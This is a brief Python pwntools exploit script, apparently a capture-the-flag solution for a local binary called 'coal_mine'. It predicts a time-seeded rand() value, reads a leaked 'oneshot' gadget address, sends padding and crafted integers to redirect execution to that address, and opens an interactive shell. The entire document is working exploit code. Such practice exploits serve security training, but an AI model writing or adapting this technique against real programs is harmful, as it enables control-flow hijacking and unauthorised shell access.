from pwn import *
from ctypes import CDLL
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0))
rnd=libc.rand()
log.info(hex(rnd))
r=process("./coal_mine")
#context.log_level='debug'
r.recvuntil("GOAL(")
oneshot=int(r.recv(10),16)
log.info(hex(oneshot))

pay=''
pay+='x'*24

r.sendline(pay)

r.sendline(str(rnd))
for i in range(0,19):
    r.sendline('65535')
r.sendline('26')
r.sendline('24')
r.sendline(f'{oneshot}')

r.interactive()
